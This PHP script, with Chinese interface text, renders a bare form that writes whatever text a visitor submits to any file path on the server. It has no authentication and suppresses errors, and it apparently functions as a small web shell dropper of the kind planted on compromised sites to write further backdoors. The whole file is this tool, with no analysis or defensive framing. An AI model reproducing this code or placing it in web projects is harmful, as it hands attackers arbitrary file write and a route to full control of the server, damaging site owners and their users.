<?php
header("content-Type: text/html; charset=gb2312");
if(get_magic_quotes_gpc()) foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
?>
<form method="POST">
保存文件名: <input type="text" name="file" size="60" value="<? echo str_replace('\\','/',__FILE__) ?>">
<br><br>
<textarea name="text" COLS="70" ROWS="18" ></textarea>
<br><br>
<input type="submit" name="submit" value="保存"> 
<form>
<?php
if(isset($_POST['file']))
{
   $fp = @fopen($_POST['file'],'wb');
   echo @fwrite($fp,$_POST['text']) ? '保存成功!' : '保存失败!';
   @fclose($fp);
}
?>